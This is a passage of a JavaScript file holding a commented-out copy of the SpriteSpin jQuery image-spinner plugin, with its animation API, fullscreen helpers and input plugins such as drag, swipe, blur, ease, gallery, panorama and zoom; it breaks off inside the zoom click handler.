                // var data = $target.data(namespace);
                // if (data) {
                    // destroy(data);
                // }
            // });
        // }
        // if (arguments.length === 2 && typeof option === 'string') {
            // option = (_a = {}, _a[option] = value, _a);
        // }
        // if (typeof option === 'object') {
            // return createOrUpdate($$1.extend(true, { target: $target }, option)).target;
        // }
        // throw new Error('Invalid call to spritespin');
        // var _a;
    // }
    // $$1.fn[namespace] = extension;
// 
    // // tslint:disable:object-literal-shorthand
    // // tslint:disable:only-arrow-functions
    // extendApi({
        // // Gets a value indicating whether the animation is currently running.
        // isPlaying: function() {
            // return getPlaybackState(this.data).handler != null;
        // },
        // // Gets a value indicating whether the animation looping is enabled.
        // isLooping: function() {
            // return this.data.loop;
        // },
        // // Starts/Stops the animation playback
        // toggleAnimation: function() {
            // if (this.isPlaying()) {
                // this.stopAnimation();
            // } else {
                // this.startAnimation();
            // }
        // },
        // // Stops animation playback
        // stopAnimation: function() {
            // this.data.animate = false;
            // stopAnimation(this.data);
        // },
        // // Starts animation playback
        // startAnimation: function() {
            // this.data.animate = true;
            // applyAnimation(this.data);
        // },
        // // Sets a value indicating whether the animation should be looped or not.
        // // This might start the animation (if the 'animate' data attribute is set to true)
        // loop: function(value) {
            // this.data.loop = value;
            // applyAnimation(this.data);
            // return this;
        // },
        // // Gets the current frame number
        // currentFrame: function() {
            // return this.data.frame;
        // },
        // // Updates SpriteSpin to the specified frame.
        // updateFrame: function(frame) {
            // updateFrame(this.data, frame);
            // return this;
        // },
        // // Skips the given number of frames
        // skipFrames: function(step) {
            // var data = this.data;
            // updateFrame(data, data.frame + (data.reverse ? -step : +step));
            // return this;
        // },
        // // Updates SpriteSpin so that the next frame is shown
        // nextFrame: function() {
            // return this.skipFrames(1);
        // },
        // // Updates SpriteSpin so that the previous frame is shown
        // prevFrame: function() {
            // return this.skipFrames(-1);
        // },
        // // Starts the animations that will play until the given frame number is reached
        // // options:
        // //   force [boolean] starts the animation, even if current frame is the target frame
        // //   nearest [boolean] animates to the direction with minimum distance to the target frame
        // playTo: function(frame, options) {
            // var data = this.data;
            // options = options || {};
            // if (!options.force && data.frame === frame) {
                // return;
            // }
            // if (options.nearest) {
                // // distance to the target frame
                // var a = frame - data.frame;
                // // distance to last frame and the to target frame
                // var b = frame > data.frame ? a - data.frames : a + data.frames;
                // // minimum distance
                // var c = Math.abs(a) < Math.abs(b) ? a : b;
                // data.reverse = c < 0;
            // }
            // data.animate = true;
            // data.loop = false;
            // data.stopFrame = frame;
            // applyAnimation(data);
            // return this;
        // }
    // });
// 
    // function pick(target, names) {
        // for (var _i = 0, names_1 = names; _i < names_1.length; _i++) {
            // var name_1 = names_1[_i];
            // if (target[name_1] || name_1 in target) {
                // return name_1;
            // }
        // }
        // return names[0];
    // }
    // var browser = {
        // requestFullscreen: pick(document.documentElement, [
            // 'requestFullscreen',
            // 'webkitRequestFullScreen',
            // 'mozRequestFullScreen',
            // 'msRequestFullscreen'
        // ]),
        // exitFullscreen: pick(document, [
            // 'exitFullscreen',
            // 'webkitExitFullscreen',
            // 'webkitCancelFullScreen',
            // 'mozCancelFullScreen',
            // 'msExitFullscreen'
        // ]),
        // fullscreenElement: pick(document, [
            // 'fullscreenElement',
            // 'webkitFullscreenElement',
            // 'webkitCurrentFullScreenElement',
            // 'mozFullScreenElement',
            // 'msFullscreenElement'
        // ]),
        // fullscreenEnabled: pick(document, [
            // 'fullscreenEnabled',
            // 'webkitFullscreenEnabled',
            // 'mozFullScreenEnabled',
            // 'msFullscreenEnabled'
        // ]),
        // fullscreenchange: pick(document, [
            // 'onfullscreenchange',
            // 'onwebkitfullscreenchange',
            // 'onmozfullscreenchange',
            // 'onMSFullscreenChange'
        // ]).replace(/^on/, ''),
        // fullscreenerror: pick(document, [
            // 'onfullscreenerror',
            // 'onwebkitfullscreenerror',
            // 'onmozfullscreenerror',
            // 'onMSFullscreenError'
        // ]).replace(/^on/, '')
    // };
    // var changeEvent = browser.fullscreenchange + '.' + namespace + '-fullscreen';
// 
    // function unbindChangeEvent() {
        // $$1(document).unbind(changeEvent);
    // }
// 
    // function bindChangeEvent(callback) {
        // unbindChangeEvent();
        // $$1(document).bind(changeEvent, callback);
    // }
    // var orientationEvent = 'orientationchange.' + namespace + '-fullscreen';
// 
    // function unbindOrientationEvent() {
        // $$1(window).unbind(orientationEvent);
    // }
// 
    // function bindOrientationEvent(callback) {
        // unbindOrientationEvent();
        // $$1(window).bind(orientationEvent, callback);
    // }
// 
    // function requestFullscreenNative(e) {
        // e = e || document.documentElement;
        // e[browser.requestFullscreen]();
    // }
// 
    // function exitFullscreen() {
        // return document[browser.exitFullscreen]();
    // }
// 
    // function fullscreenEnabled() {
        // return document[browser.fullscreenEnabled];
    // }
// 
    // function fullscreenElement() {
        // return document[browser.fullscreenElement];
    // }
// 
    // function isFullscreen() {
        // return !!fullscreenElement();
    // }
// 
    // function toggleFullscreen(data, opts) {
        // if (isFullscreen()) {
            // this.apiRequestFullscreen(opts);
        // } else {
            // this.exitFullscreen();
        // }
    // }
// 
    // function requestFullscreen(data, opts) {
        // opts = opts || {};
        // var oWidth = data.width;
        // var oHeight = data.height;
        // var oSource = data.source;
        // var oSize = data.sizeMode;
        // var oResponsive = data.responsive;
        // var enter = function() {
            // data.width = window.screen.width;
            // data.height = window.screen.height;
            // data.source = (opts.source || oSource);
            // data.sizeMode = opts.sizeMode || 'fit';
            // data.responsive = false;
            // boot(data);
        // };
        // var exit = function() {
            // data.width = oWidth;
            // data.height = oHeight;
            // data.source = oSource;
            // data.sizeMode = oSize;
            // data.responsive = oResponsive;
            // boot(data);
        // };
        // bindChangeEvent(function() {
            // if (isFullscreen()) {
                // enter();
                // bindOrientationEvent(enter);
            // } else {
                // unbindChangeEvent();
                // unbindOrientationEvent();
                // exit();
            // }
        // });
        // requestFullscreenNative(data.target[0]);
    // }
    // extendApi({
        // fullscreenEnabled: fullscreenEnabled,
        // fullscreenElement: fullscreenElement,
        // exitFullscreen: exitFullscreen,
        // toggleFullscreen: function(opts) {
            // toggleFullscreen(this.data, opts);
        // },
        // requestFullscreen: function(opts) {
            // requestFullscreen(this.data, opts);
        // }
    // });
// 
    // (function() {
        // var NAME = 'click';
// 
        // function click(e, data) {
            // if (data.loading || !data.stage.is(':visible')) {
                // return;
            // }
            // updateInput(e, data);
            // var input = getInputState(data);
            // var half, pos;
            // var target = data.target,
                // offset = target.offset();
            // if (data.orientation === 'horizontal') {
                // half = target.innerWidth() / 2;
                // pos = input.currentX - offset.left;
            // } else {
                // half = target.innerHeight() / 2;
                // pos = input.currentY - offset.top;
            // }
            // updateFrame(data, data.frame + (pos > half ? 1 : -1));
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // mouseup: click,
            // touchend: click
        // });
    // })();
// 
    // (function() {
        // var NAME = 'drag';
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
// 
        // function getAxis(data) {
            // if (typeof data.orientation === 'number') {
                // return data.orientation * Math.PI / 180;
            // }
            // if (data.orientation === 'horizontal') {
                // return 0;
            // }
            // return Math.PI / 2;
        // }
// 
        // function onInit(e, data) {
            // var state = getState$$1(data);
            // var d = [200, 1500];
            // var t = data.touchScrollTimer || d;
            // state.minTime = t[0] || d[0];
            // state.maxTime = t[1] || d[1];
        // }
// 
        // function dragStart(e, data) {
            // var state = getState$$1(data);
            // if (data.loading || is(data, 'dragging') || data['zoomPinFrame'] && !data.stage.is(':visible')) {
                // return;
            // }
            // // Touch scroll can only be disabled by cancelling the 'touchstart' event.
            // // If we would try to cancel the 'touchmove' event during a scroll
            // // chrome browser raises an error
            // //
            // // When a user interacts with sprite spin, we dont know whether the intention
            // // is to scroll the page or to roll the spin.
            // //
            // // On first interaction with SpriteSpin the scroll is not disabled
            // // On double tap within 200ms the scroll is not disabled
            // // Scroll is only disabled if there was an interaction with SpriteSpin in the past 1500ms
            // var now = new Date().getTime();
            // if (state.endAt && (now - state.endAt > state.maxTime)) {
                // // reset timer if the user has no interaction with spritespin within 1500ms
                // state.startAt = null;
                // state.endAt = null;
            // }
            // if (state.startAt && (now - state.startAt > state.minTime)) {
                // // disable scroll only if there was already an interaction with spritespin
                // // however, allow scrolling on double tab within 200ms
                // e.preventDefault();
            // }
            // state.startAt = now;
            // state.wasPlaying = !!getPlaybackState(data).handler;
            // state.frame = data.frame || 0;
            // state.lane = data.lane || 0;
            // flag(data, 'dragging', true);
            // updateInput(e, data);
        // }
// 
        // function dragEnd(e, data) {
            // if (is(data, 'dragging')) {
                // getState$$1(data).endAt = new Date().getTime();
                // flag(data, 'dragging', false);
                // resetInput(data);
                // if (data.retainAnimate && getState$$1(data).wasPlaying) {
                    // startAnimation(data);
                // }
            // }
        // }
// 
        // function drag(e, data) {
            // var state = getState$$1(data);
            // var input = getInputState(data);
            // if (!is(data, 'dragging')) {
                // return;
            // }
            // updateInput(e, data);
            // var rad = getAxis(data);
            // var sn = Math.sin(rad);
            // var cs = Math.cos(rad);
            // var x = ((input.nddX * cs - input.nddY * sn) * data.sense) || 0;
            // var y = ((input.nddX * sn + input.nddY * cs) * (data.senseLane || data.sense)) || 0;
            // // accumulate
            // state.frame += data.frames * x;
            // state.lane += data.lanes * y;
            // // update spritespin
            // var oldFrame = data.frame;
            // var oldLane = data.lane;
            // updateFrame(data, Math.floor(state.frame), Math.floor(state.lane));
            // stopAnimation(data);
        // }
// 
        // function mousemove(e, data) {
            // dragStart(e, data);
            // drag(e, data);
        // }
        // registerPlugin('drag', {
            // name: 'drag',
            // onInit: onInit,
            // mousedown: dragStart,
            // mousemove: drag,
            // mouseup: dragEnd,
            // documentmousemove: drag,
            // documentmouseup: dragEnd,
            // touchstart: dragStart,
            // touchmove: drag,
            // touchend: dragEnd,
            // touchcancel: dragEnd
        // });
        // registerPlugin('move', {
            // name: 'move',
            // onInit: onInit,
            // mousemove: mousemove,
            // mouseleave: dragEnd,
            // touchstart: dragStart,
            // touchmove: drag,
            // touchend: dragEnd,
            // touchcancel: dragEnd
        // });
    // })();
// 
    // (function() {
        // var NAME = 'hold';
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
// 
        // function rememberOptions(data) {
            // var state = getState$$1(data);
            // state.frameTime = data.frameTime;
            // state.animate = data.animate;
            // state.reverse = data.reverse;
        // }
// 
        // function restoreOptions(data) {
            // var state = getState$$1(data);
            // data.frameTime = state.frameTime;
            // data.animate = state.animate;
            // data.reverse = state.reverse;
        // }
// 
        // function start(e, data) {
            // if (is(data, 'loading') || is(data, 'dragging') || !data.stage.is(':visible')) {
                // return;
            // }
            // rememberOptions(data);
            // updateInput(e, data);
            // flag(data, 'dragging', true);
            // data.animate = true;
            // applyAnimation(data);
        // }
// 
        // function stop(e, data) {
            // flag(data, 'dragging', false);
            // resetInput(data);
            // stopAnimation(data);
            // restoreOptions(data);
            // applyAnimation(data);
        // }
// 
        // function update(e, data) {
            // if (!is(data, 'dragging')) {
                // return;
            // }
            // updateInput(e, data);
            // var input = getInputState(data);
            // var half, delta;
            // var target = data.target,
                // offset = target.offset();
            // if (data.orientation === 'horizontal') {
                // half = target.innerWidth() / 2;
                // delta = (input.currentX - offset.left - half) / half;
            // } else {
                // half = (data.height / 2);
                // delta = (input.currentY - offset.top - half) / half;
            // }
            // data.reverse = delta < 0;
            // delta = delta < 0 ? -delta : delta;
            // data.frameTime = 80 * (1 - delta) + 20;
            // if (((data.orientation === 'horizontal') && (input.dX < input.dY)) ||
                // ((data.orientation === 'vertical') && (input.dX < input.dY))) {
                // e.preventDefault();
            // }
        // }
// 
        // function onFrame(e, data) {
            // data.animate = true;
            // applyAnimation(data);
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // mousedown: start,
            // mousemove: update,
            // mouseup: stop,
            // mouseleave: stop,
            // touchstart: start,
            // touchmove: update,
            // touchend: stop,
            // touchcancel: stop,
            // onFrame: onFrame
        // });
    // })();
// 
    // (function() {
        // var NAME = 'swipe';
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
// 
        // function getOption(data, name, fallback) {
            // return data[name] || fallback;
        // }
// 
        // function init(e, data) {
            // var state = getState$$1(data);
            // state.fling = getOption(data, 'swipeFling', 10);
            // state.snap = getOption(data, 'swipeSnap', 0.50);
        // }
// 
        // function start(e, data) {
            // if (!data.loading && !is(data, 'dragging')) {
                // updateInput(e, data);
                // flag(data, 'dragging', true);
            // }
        // }
// 
        // function update(e, data) {
            // if (!is(data, 'dragging')) {
                // return;
            // }
            // updateInput(e, data);
            // var frame = data.frame;
            // var lane = data.lane;
            // updateFrame(data, frame, lane);
        // }
// 
        // function end(e, data) {
            // if (!is(data, 'dragging')) {
                // return;
            // }
            // flag(data, 'dragging', false);
            // var state = getState$$1(data);
            // var input = getInputState(data);
            // var frame = data.frame;
            // var lane = data.lane;
            // var snap = state.snap;
            // var fling = state.fling;
            // var dS, dF;
            // if (data.orientation === 'horizontal') {
                // dS = input.ndX;
                // dF = input.ddX;
            // } else {
                // dS = input.ndY;
                // dF = input.ddY;
            // }
            // if (dS >= snap || dF >= fling) {
                // frame = data.frame - 1;
            // } else if (dS <= -snap || dF <= -fling) {
                // frame = data.frame + 1;
            // }
            // resetInput(data);
            // updateFrame(data, frame, lane);
            // stopAnimation(data);
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // onLoad: init,
            // mousedown: start,
            // mousemove: update,
            // mouseup: end,
            // mouseleave: end,
            // touchstart: start,
            // touchmove: update,
            // touchend: end,
            // touchcancel: end
        // });
    // })();
// 
    // (function() {
        // var NAME = 'wheel';
// 
        // function wheel(e, data) {
            // if (!data.loading && data.stage.is(':visible')) {
                // e.preventDefault();
                // var we = e.originalEvent;
                // var signX = we.deltaX === 0 ? 0 : we.deltaX > 0 ? 1 : -1;
                // var signY = we.deltaY === 0 ? 0 : we.deltaY > 0 ? 1 : -1;
                // updateFrame(data, data.frame + signY, data.lane + signX);
            // }
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // wheel: wheel
        // });
    // })();
// 
    // (function() {
        // var template = "\n<div class='spritespin-progress'>\n  <div class='spritespin-progress-label'></div>\n  <div class='spritespin-progress-bar'></div>\n</div>\n";
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
        // var NAME = 'progress';
// 
        // function onInit(e, data) {
            // var state = getState$$1(data);
            // if (!state.stage) {
                // state.stage = $$1(template);
                // state.stage.appendTo(data.target);
            // }
            // state.stage.find('.spritespin-progress-label')
                // .text("0%")
                // .css({ 'text-align': 'center' });
            // state.stage.find('.spritespin-progress-bar').css({
                // width: "0%"
            // });
            // state.stage.hide().fadeIn();
        // }
// 
        // function onProgress(e, data) {
            // var state = getState$$1(data);
            // state.stage.find('.spritespin-progress-label')
                // .text(data.progress.percent + "%")
                // .css({ 'text-align': 'center' });
            // state.stage.find('.spritespin-progress-bar').css({
                // width: data.progress.percent + "%"
            // });
        // }
// 
        // function onLoad(e, data) {
            // $$1(getState$$1(data).stage).fadeOut();
        // }
// 
        // function onDestroy(e, data) {
            // $$1(getState$$1(data).stage).remove();
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // onInit: onInit,
            // onProgress: onProgress,
            // onLoad: onLoad,
            // onDestroy: onDestroy
        // });
    // })();
// 
    // (function() {
        // var NAME = '360';
// 
        // function onLoad(e, data) {
            // data.stage.find('.spritespin-frames').detach();
            // if (data.renderer === 'image') {
                // $(data.images).addClass('spritespin-frames').appendTo(data.stage);
            // }
        // }
// 
        // function onDraw(e, data) {
            // var specs = findSpecs(data.metrics, data.frames, data.frame, data.lane);
            // var sheet = specs.sheet;
            // var sprite = specs.sprite;
            // if (!sheet || !sprite) {
                // return;
            // }
            // var src = data.source[sheet.id];
            // var image = data.images[sheet.id];
            // if (data.renderer === 'canvas') {
                // data.canvas.show();
                // var w = data.canvas[0].width / data.canvasRatio;
                // var h = data.canvas[0].height / data.canvasRatio;
                // data.context.clearRect(0, 0, w, h);
                // data.context.drawImage(image, sprite.sampledX, sprite.sampledY, sprite.sampledWidth, sprite.sampledHeight, 0, 0, w, h);
                // return;
            // }
            // var scaleX = data.stage.innerWidth() / sprite.sampledWidth;
            // var scaleY = data.stage.innerHeight() / sprite.sampledHeight;
            // var top = Math.floor(-sprite.sampledY * scaleY);
            // var left = Math.floor(-sprite.sampledX * scaleX);
            // var width = Math.floor(sheet.sampledWidth * scaleX);
            // var height = Math.floor(sheet.sampledHeight * scaleY);
            // if (data.renderer === 'background') {
                // data.stage.css({
                    // 'background-image': "url('" + src + "')",
                    // 'background-position': left + "px " + top + "px",
                    // 'background-repeat': 'no-repeat',
                    // // set custom background size to enable responsive rendering
                    // '-webkit-background-size': width + "px " + height + "px",
                    // '-moz-background-size': width + "px " + height + "px",
                    // '-o-background-size': width + "px " + height + "px",
                    // 'background-size': width + "px " + height + "px" /* Chrome, Firefox 4+, IE 9+, Opera, Safari 5+ */
                // });
                // return;
            // }
            // $(data.images).hide();
            // $(image).show().css({
                // position: 'absolute',
                // top: top,
                // left: left,
                // 'max-width': 'initial',
                // width: width,
                // height: height
            // });
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // onLoad: onLoad,
            // onDraw: onDraw
        // });
    // })();
// 
    // (function() {
        // var NAME = 'blur';
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
// 
        // function getOption(data, name, fallback) {
            // return data[name] || fallback;
        // }
// 
        // function init(e, data) {
            // var state = getState$$1(data);
            // state.canvas = state.canvas || $$1("<canvas class='blur-layer'></canvas>");
            // state.context = state.context || state.canvas[0].getContext('2d');
            // state.steps = state.steps || [];
            // state.fadeTime = Math.max(getOption(data, 'blurFadeTime', 200), 1);
            // state.frameTime = Math.max(getOption(data, 'blurFrameTime', data.frameTime), 16);
            // state.trackTime = null;
            // state.cssBlur = !!getOption(data, 'blurCss', false);
            // var inner = getInnerSize(data);
            // var outer = data.responsive ? getComputedSize(data) : getOuterSize(data);
            // var css = getInnerLayout(data.sizeMode, inner, outer);
            // state.canvas[0].width = data.width * data.canvasRatio;
            // state.canvas[0].height = data.height * data.canvasRatio;
            // state.canvas.css(css).show();
            // state.context.scale(data.canvasRatio, data.canvasRatio);
            // data.target.append(state.canvas);
        // }
// 
        // function onFrame(e, data) {
            // var state = getState$$1(data);
            // trackFrame(data);
            // if (state.timeout == null) {
                // loop(data);
            // }
        // }
// 
        // function trackFrame(data) {
            // var state = getState$$1(data);
            // var ani = getPlaybackState(data);
            // // distance between frames
            // var d = Math.abs(data.frame - ani.lastFrame);
            // // shortest distance
            // d = d >= data.frames / 2 ? data.frames - d : d;
            // state.steps.unshift({
                // frame: data.frame,
                // lane: data.lane,
                // live: 1,
                // step: state.frameTime / state.fadeTime,
                // d: d,
                // alpha: 0
            // });
        // }
        // var toRemove = [];
// 
        // function removeOldFrames(frames) {
            // toRemove.length = 0;
            // for (var i = 0; i < frames.length; i += 1) {
                // if (frames[i].alpha <= 0) {
                    // toRemove.push(i);
                // }
            // }
            // for (var _i = 0, toRemove_1 = toRemove; _i < toRemove_1.length; _i++) {
                // var item = toRemove_1[_i];
                // frames.splice(item, 1);
            // }
        // }
// 
        // function loop(data) {
            // var state = getState$$1(data);
            // state.timeout = window.setTimeout(function() { tick(data); }, state.frameTime);
        // }
// 
        // function killLoop(data) {
            // var state = getState$$1(data);
            // window.clearTimeout(state.timeout);
            // state.timeout = null;
        // }
// 
        // function applyCssBlur(canvas, d) {
            // var amount = Math.min(Math.max((d / 2) - 4, 0), 2.5);
            // var blur = "blur(" + amount + "px)";
            // canvas.css({
                // '-webkit-filter': blur,
                // filter: blur
            // });
        // }
// 
        // function clearFrame(data, state) {
            // state.canvas.show();
            // var w = state.canvas[0].width / data.canvasRatio;
            // var h = state.canvas[0].height / data.canvasRatio;
            // // state.context.clearRect(0, 0, w, h)
        // }
// 
        // function drawFrame(data, state, step) {
            // if (step.alpha <= 0) {
                // return;
            // }
            // var specs = findSpecs(data.metrics, data.frames, step.frame, step.lane);
            // var sheet = specs.sheet;
            // var sprite = specs.sprite;
            // if (!sheet || !sprite) {
                // return;
            // }
            // var src = data.source[sheet.id];
            // var image = data.images[sheet.id];
            // if (image.complete === false) {
                // return;
            // }
            // state.canvas.show();
            // var w = state.canvas[0].width / data.canvasRatio;
            // var h = state.canvas[0].height / data.canvasRatio;
            // state.context.globalAlpha = step.alpha;
            // state.context.drawImage(image, sprite.sampledX, sprite.sampledY, sprite.sampledWidth, sprite.sampledHeight, 0, 0, w, h);
        // }
// 
        // function tick(data) {
            // var state = getState$$1(data);
            // killLoop(data);
            // if (!state.context) {
                // return;
            // }
            // var d = 0;
            // clearFrame(data, state);
            // state.context.clearRect(0, 0, data.width, data.height);
            // for (var _i = 0, _a = state.steps; _i < _a.length; _i++) {
                // var step = _a[_i];
                // step.live = Math.max(step.live - step.step, 0);
                // step.alpha = Math.max(step.live - 0.25, 0);
                // drawFrame(data, state, step);
                // d += step.alpha + step.d;
            // }
            // if (state.cssBlur) {
                // applyCssBlur(state.canvas, d);
            // }
            // removeOldFrames(state.steps);
            // if (state.steps.length) {
                // loop(data);
            // }
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // onLoad: init,
            // onFrameChanged: onFrame
        // });
    // })();
// 
    // (function() {
        // var max = Math.max;
        // var min = Math.min;
        // var NAME = 'ease';
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
// 
        // function getOption(data, name, fallback) {
            // return data[name] || fallback;
        // }
// 
        // function init(e, data) {
            // var state = getState$$1(data);
            // state.maxSamples = max(getOption(data, 'easeMaxSamples', 5), 0);
            // state.damping = max(min(getOption(data, 'easeDamping', 0.9), 0.999), 0);
            // state.abortTime = max(getOption(data, 'easeAbortTime', 250), 16);
            // state.updateTime = max(getOption(data, 'easeUpdateTime', data.frameTime), 16);
            // state.samples = [];
            // state.steps = [];
        // }
// 
        // function update(e, data) {
            // if (is(data, 'dragging')) {
                // killLoop(data);
                // sampleInput(data);
            // }
        // }
// 
        // function end(e, data) {
            // var state = getState$$1(data);
            // var samples = state.samples;
            // var last;
            // var lanes = 0;
            // var frames = 0;
            // var time = 0;
            // for (var _i = 0, samples_1 = samples; _i < samples_1.length; _i++) {
                // var sample = samples_1[_i];
                // if (!last) {
                    // last = sample;
                    // continue;
                // }
                // var dt = sample.time - last.time;
                // if (dt > state.abortTime) {
                    // lanes = frames = time = 0;
                    // return killLoop(data);
                // }
                // frames += sample.frame - last.frame;
                // lanes += sample.lane - last.lane;
                // time += dt;
                // last = sample;
            // }
            // samples.length = 0;
            // if (!time) {
                // return;
            // }
            // state.lane = data.lane;
            // state.lanes = 0;
            // state.laneStep = lanes / time * state.updateTime;
            // state.frame = data.frame;
            // state.frames = 0;
            // state.frameStep = frames / time * state.updateTime;
            // loop(data);
        // }
// 
        // function sampleInput(data) {
            // var state = getState$$1(data);
            // // add a new sample
            // state.samples.push({
                // time: new Date().getTime(),
                // frame: data.frame,
                // lane: data.lane
            // });
            // // drop old samples
            // while (state.samples.length > state.maxSamples) {
                // state.samples.shift();
            // }
        // }
// 
        // function killLoop(data) {
            // var state = getState$$1(data);
            // if (state.handler != null) {
                // window.clearTimeout(state.handler);
                // state.handler = null;
            // }
        // }
// 
        // function loop(data) {
            // var state = getState$$1(data);
            // state.handler = window.setTimeout(function() { tick(data); }, state.updateTime);
        // }
// 
        // function tick(data) {
            // var state = getState$$1(data);
            // state.lanes += state.laneStep;
            // state.frames += state.frameStep;
            // state.laneStep *= state.damping;
            // state.frameStep *= state.damping;
            // var frame = Math.floor(state.frame + state.frames);
            // var lane = Math.floor(state.lane + state.lanes);
            // updateFrame(data, frame, lane);
            // if (is(data, 'dragging')) {
                // killLoop(data);
            // } else if (Math.abs(state.frameStep) > 0.005 || Math.abs(state.laneStep) > 0.005) {
                // loop(data);
            // } else {
                // killLoop(data);
            // }
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // onLoad: init,
            // mousemove: update,
            // mouseup: end,
            // mouseleave: end,
            // touchmove: update,
            // touchend: end,
            // touchcancel: end
        // });
    // })();
// 
    // (function() {
        // var NAME = 'gallery';
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
// 
        // function getOption(data, name, fallback) {
            // return data[name] || fallback;
        // }
// 
        // function load(e, data) {
            // var state = getState$$1(data);
            // state.images = [];
            // state.offsets = [];
            // state.frame = data.frame;
            // state.speed = getOption(data, 'gallerySpeed', 500);
            // state.opacity = getOption(data, 'galleryOpacity', 0.25);
            // state.stage = getOption(data, 'galleryStage', $$1('<div></div>'));
            // state.stage.empty().addClass('gallery-stage').prependTo(data.stage);
            // var size = 0;
            // for (var _i = 0, _a = data.images; _i < _a.length; _i++) {
                // var image = _a[_i];
                // var naturalSize$$1 = naturalSize(image);
                // var scale = data.height / naturalSize$$1.height;
                // var img = $$1(image);
                // state.stage.append(img);
                // state.images.push(img);
                // state.offsets.push(-size + (data.width - image.width * scale) / 2);
                // size += data.width;
                // img.css({
                    // 'max-width': 'initial',
                    // opacity: state.opacity,
                    // width: data.width,
                    // height: data.height
                // });
            // }
            // var innerSize = getInnerSize(data);
            // var outerSize = data.responsive ? getComputedSize(data) : getOuterSize(data);
            // var layout = getInnerLayout(data.sizeMode, innerSize, outerSize);
            // state.stage.css(layout).css({ width: size, left: state.offsets[state.frame] });
            // state.images[state.frame].animate({ opacity: 1 }, { duration: state.speed });
        // }
// 
        // function draw(e, data) {
            // var state = getState$$1(data);
            // var input = getInputState(data);
            // var isDragging = is(data, 'dragging');
            // if (state.frame !== data.frame && !isDragging) {
                // state.stage.stop(true, false).animate({ left: state.offsets[data.frame] }, { duration: state.speed });
                // state.images[state.frame].animate({ opacity: state.opacity }, { duration: state.speed });
                // state.frame = data.frame;
                // state.images[state.frame].animate({ opacity: 1 }, { duration: state.speed });
                // state.stage.animate({ left: state.offsets[state.frame] });
            // } else if (isDragging || state.dX !== input.dX) {
                // state.dX = input.dX;
                // state.ddX = input.ddX;
                // state.stage.stop(true, true).css({ left: state.offsets[state.frame] + state.dX });
            // }
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // onLoad: load,
            // onDraw: draw
        // });
    // })();
// 
    // (function() {
        // var NAME = 'panorama';
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
// 
        // function onLoad(e, data) {
            // var state = getState$$1(data);
            // var sprite = data.metrics[0];
            // if (!sprite) {
                // return;
            // }
            // if (data.orientation === 'horizontal') {
                // state.scale = data.target.innerHeight() / sprite.sampledHeight;
                // data.frames = sprite.sampledWidth;
            // } else {
                // state.scale = data.target.innerWidth() / sprite.sampledWidth;
                // data.frames = sprite.sampledHeight;
            // }
            // var width = Math.floor(sprite.sampledWidth * state.scale);
            // var height = Math.floor(sprite.sampledHeight * state.scale);
            // data.stage.css({
                // 'background-image': "url(" + data.source[sprite.id] + ")",
                // 'background-repeat': 'repeat-both',
                // // set custom background size to enable responsive rendering
                // '-webkit-background-size': width + "px " + height + "px",
                // '-moz-background-size': width + "px " + height + "px",
                // '-o-background-size': width + "px " + height + "px",
                // 'background-size': width + "px " + height + "px" /* Chrome, Firefox 4+, IE 9+, Opera, Safari 5+ */
            // });
        // }
// 
        // function onDraw(e, data) {
            // var state = getState$$1(data);
            // var px = data.orientation === 'horizontal' ? 1 : 0;
            // var py = px ? 0 : 1;
            // var offset = data.frame % data.frames;
            // var left = Math.round(px * offset * state.scale);
            // var top = Math.round(py * offset * state.scale);
            // data.stage.css({ 'background-position': left + "px " + top + "px" });
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // onLoad: onLoad,
            // onDraw: onDraw
        // });
    // })();
// 
    // (function() {
        // var NAME = 'zoom';
// 
        // function getState$$1(data) {
            // return getPluginState(data, NAME);
        // }
// 
        // function getOption(data, name, fallback) {
            // return name in data ? data[name] : fallback;
        // }
// 
        // function onInit(e, data) {
            // var state = getState$$1(data);
            // state.source = getOption(data, 'zoomSource', data.source);
            // state.useWheel = getOption(data, 'zoomUseWheel', false);
            // state.useClick = getOption(data, 'zoomUseClick', true);
            // state.pinFrame = getOption(data, 'zoomPinFrame', true);
            // state.doubleClickTime = getOption(data, 'zoomDoubleClickTime', 500);
            // state.stage = state.stage || $$1("<div class='zoom-stage'></div>");
            // state.stage.css({
                    // width: '100%',
                    // height: '100%',
                    // top: 0,
                    // left: 0,
                    // bottom: 0,
                    // right: 0,
                    // position: 'absolute'
                // })
                // .appendTo(data.target)
                // .hide();
        // }
// 
        // function onDestroy(e, data) {
            // var state = getState$$1(data);
            // if (state.stage) {
                // state.stage.remove();
                // delete state.stage;
            // }
        // }
// 
        // function updateInput$$1(e, data) {
            // var state = getState$$1(data);
            // if (!state.stage.is(':visible')) {
                // return;
            // }
            // e.preventDefault();
            // if (state.pinFrame) {
                // // hack into drag/move module and disable dragging
                // // prevents frame change during zoom mode
                // flag(data, 'dragging', false);
            // }
            // // grab touch/cursor position
            // var cursor = getCursorPosition(e);
            // // normalize cursor position into [0:1] range
            // var x = cursor.x / data.width;
            // var y = cursor.y / data.height;
            // if (state.oldX == null) {
                // state.oldX = x;
                // state.oldY = y;
            // }
            // if (state.currentX == null) {
                // state.currentX = x;
                // state.currentY = y;
            // }
            // // calculate move delta since last frame and remember current position
            // var dx = x - state.oldX;
            // var dy = y - state.oldY;
            // state.oldX = x;
            // state.oldY = y;
            // // invert drag direction for touch events to enable 'natural' scrolling
            // if (e.type.match(/touch/)) {
                // dx = -dx;
                // dy = -dy;
            // }
            // // accumulate display coordinates
            // state.currentX = clamp(state.currentX + dx, 0, 1);
            // state.currentY = clamp(state.currentY + dy, 0, 1);
            // updateFrame(data, data.frame, data.lane);
        // }
// 
        // function onClick(e, data) {
            // var state = getState$$1(data);
            // if (!state.useClick) {
                // return;
            // }
